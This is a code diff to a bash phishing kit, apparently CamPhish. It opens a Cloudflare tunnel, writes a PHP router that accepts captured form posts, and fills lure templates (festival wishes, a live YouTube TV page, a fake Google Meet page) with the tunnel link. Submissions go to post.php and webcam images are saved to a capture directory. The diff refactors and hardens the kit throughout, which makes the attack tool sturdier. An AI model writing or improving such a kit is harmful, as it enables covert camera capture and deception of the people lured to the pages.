@@ -1,4 +1,7 @@
+#!/bin/bash
 
+# Set error handling
+set -e
 
 # Windows compatibility check
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
@@ -288,40 +291,109 @@ checkfound
 }
 
 payload_cloudflare() {
-link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cld.log")
+    # Get the Cloudflare tunnel URL
+    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cld.log" 2>/dev/null || true)
+    
+    if [ -z "$link" ]; then
+        printf "\e[1;91m[!] Failed to get Cloudflare tunnel URL. Please check your internet connection.\e[0m\n"
+        exit 1
+    fi
+    
+    printf "\e[1;92m[+] Using Cloudflare tunnel URL: %s\e[0m\n" "$link"
 
-# Create a simple PHP router
+# Create a secure PHP router
 cat > index.php << 'EOL'
 <?php
-$request = $_SERVER['REQUEST_URI'];
+// Disable error display in production
+error_reporting(0);
+ini_set('display_errors', 0);
 
-// Serve the appropriate HTML file
-if (file_exists('index2.html')) {
-    readfile('index2.html');
-} else if (file_exists('index.html')) {
-    readfile('index.html');
+// Set security headers
+header('X-Frame-Options: DENY');
+header('X-Content-Type-Options: nosniff');
+header('X-XSS-Protection: 1; mode=block');
+header('Referrer-Policy: no-referrer');
+header('Content-Security-Policy: default-src \'self\'');
+
+// Get the request URI
+$request = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+$request = ltrim($request, '/');
+
+// Route requests
+if ($request === 'post.php' || $request === '') {
+    // Handle form submissions
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        require_once 'post.php';
+        exit;
+    }
+    // Serve the main page
+    if (file_exists('index2.html')) {
+        readfile('index2.html');
+    } else if (file_exists('index.html')) {
+        readfile('index.html');
+    } else {
+        header('HTTP/1.0 404 Not Found');
+        echo 'Page not found';
+    }
+} else if ($request === 'debug_log.php') {
+    // Handle debug logs
+    require_once 'debug_log.php';
+} else if (file_exists($request)) {
+    // Serve static files if they exist
+    $mime_types = [
+        'html' => 'text/html',
+        'css'  => 'text/css',
+        'js'   => 'application/javascript',
+        'png'  => 'image/png',
+        'jpg'  => 'image/jpeg',
+        'jpeg' => 'image/jpeg',
+        'gif'  => 'image/gif',
+    ];
+    
+    $ext = strtolower(pathinfo($request, PATHINFO_EXTENSION));
+    if (array_key_exists($ext, $mime_types)) {
+        header('Content-Type: ' . $mime_types[$ext]);
+    }
+    readfile($request);
 } else {
-    // Default response
-    header('Content-Type: text/plain');
-    echo 'Page not found';
+    // 404 Not Found
+    header('HTTP/1.0 404 Not Found');
+    echo '404 Not Found';
 }
 ?>
 EOL
 
 # Process the selected template
 if [[ $option_tem -eq 1 ]]; then
+    # Festival Wishes template
+    if [ ! -f "festivalwishes.html" ]; then
+        printf "\e[1;91m[!] Error: festivalwishes.html not found!\e[0m\n"
+        exit 1
+    fi
     sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
     sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
     rm -f index3.html
     
 elif [[ $option_tem -eq 2 ]]; then
+    # Live YouTube TV template
+    if [ ! -f "LiveYTTV.html" ]; then
+        printf "\e[1;91m[!] Error: LiveYTTV.html not found!\e[0m\n"
+        exit 1
+    fi
     sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
     sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
     rm -f index3.html
     
 elif [[ $option_tem -eq 4 ]]; then
-    # For Google Meet, we need to handle both the form and image capture
-    sed 's+forwarding_link+'$link'+g' GoogleMeet.html > index2.html
+    # Google Meet template
+    if [ ! -f "GoogleMeet.html" ]; then
+        printf "\e[1;91m[!] Error: GoogleMeet.html not found!\e[0m\n"
+        exit 1
+    fi
+    
+    # Create index2.html with the Google Meet template
+    sed 's+forwarding_link+'$link'+g' GoogleMeet.html | \
+    sed 's+abc-defg-hij+'${meet_code:-abc-defg-hij}'+g' > index2.html
     
     # Create a directory for captured images if it doesn't exist
     mkdir -p captured_images
@@ -624,37 +696,47 @@ fi
 }
 
 select_template() {
-if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
-printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
-sleep 1
-clear
-banner
-camphish
-else
-printf "\n-----Choose a template----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
-default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
-option_tem="${option_tem:-${default_option_template}}"
-if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
-fest_name="${fest_name//[[:space:]]/}"
-elif [[ $option_tem -eq 2 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
-elif [[ $option_tem -eq 3 ]]; then
-    printf ""
-elif [[ $option_tem -eq 4 ]]; then
-    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter meeting code (e.g., abc-defg-hij): \e[0m' meet_code
-    meet_code="${meet_code//[^a-zA-Z0-9-]/}"  # Clean input
-else
-printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
-sleep 1
-select_template
-fi
-fi
+    if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
+        printf "\e[1;93m[!] Invalid tunnel option! try again\e[0m\n"
+        sleep 1
+        clear
+        banner
+        camphish
+        return 1
+    fi
+    
+    printf "\n-----Choose a template----\n"
+    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
+    
+    default_option_template="1"
+    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template [1-4, default:1]: \e[0m' option_tem
+    option_tem="${option_tem:-${default_option_template}}"
+    
+    case $option_tem in
+        1)
+            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
+            fest_name="${fest_name//[^a-zA-Z0-9]/}"  # Only allow alphanumeric characters
+            ;;
+        2)
+            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+            yt_video_ID="${yt_video_ID//[^a-zA-Z0-9_-]/}"  # Clean YouTube ID
+            ;;
+        3)
+            # Online Meeting - no additional input needed
+            ;;
+        4)
+            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter meeting code (e.g., abc-defg-hij): \e[0m' meet_code
+            meet_code="${meet_code//[^a-zA-Z0-9-]/}"  # Only allow alphanumeric and hyphens
+            ;;
+        *)
+            printf "\e[1;93m[!] Invalid template option! Please try again\e[0m\n"
+            sleep 1
+            select_template
+            ;;
+    esac
 }
 
 banner
